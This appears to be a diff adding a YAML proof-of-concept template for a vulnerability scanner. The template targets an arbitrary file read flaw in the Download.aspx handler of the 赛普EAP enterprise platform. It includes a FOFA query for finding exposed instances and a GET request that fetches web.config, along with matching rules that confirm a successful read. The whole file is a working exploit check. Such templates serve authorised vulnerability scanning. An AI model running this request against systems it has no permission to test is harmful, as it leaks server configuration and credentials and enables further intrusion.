@@ -1,0 +1,24 @@
+id: poc-yaml-chinasap-eap-download-apsx-anyfile-read
+info:
+  name: 赛普EAP企业适配管理平台 Download.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 赛普EAP企业适配管理平台
+  fofa: body="IDWebSoft/"
+requests:
+- method: GET
+  path: /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle=
+  expression: 'status_code == 200 &&
+
+    contains(body,"<configuration>") &&
+
+    contains(body,"<system.web>") &&
+
+    contains(body,"web.config") &&
+
+    contains(headers,"filename=")
+
+    '
+variables: {}
+transport: http
